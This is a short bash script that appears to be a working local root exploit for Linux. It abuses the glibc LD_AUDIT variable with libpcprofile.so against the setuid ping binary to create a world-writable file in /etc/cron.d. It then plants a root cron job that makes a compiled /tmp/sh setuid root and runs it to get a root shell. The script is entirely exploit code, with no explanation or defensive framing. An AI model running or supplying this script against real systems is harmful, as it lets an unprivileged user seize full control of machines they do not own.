#!/bin/bash

if [ ! -f /lib/libpcprofile.so ]; then
echo "Machine not vulnerable."
exit
fi

gcc -o /tmp/sh sh.c
echo "Creating /etc/cron.d/updatedb"
umask 0
LD_AUDIT="libpcprofile.so" PCPROFILE_OUTPUT="/etc/cron.d/updatedb" ping >/dev/null 2>&1
if [ ! -f /etc/cron.d/updatedb ]; then
echo "Could not create /etc/cron.d/updatedb"
echo "Machine not vulnerable."
exit
fi

CTIME=$(/bin/date +%M)
echo "Current minute:" $CTIME
STIME=$(/usr/bin/expr $CTIME + 2)

printf $STIME" * * * * root chown root.root /tmp/sh; chmod u+s /tmp/sh\n" >/etc/cron.d/updatedb
echo "UID0 in 2 minutes"
echo "Please wait..."
sleep 120
echo "And voila..."
/tmp/sh
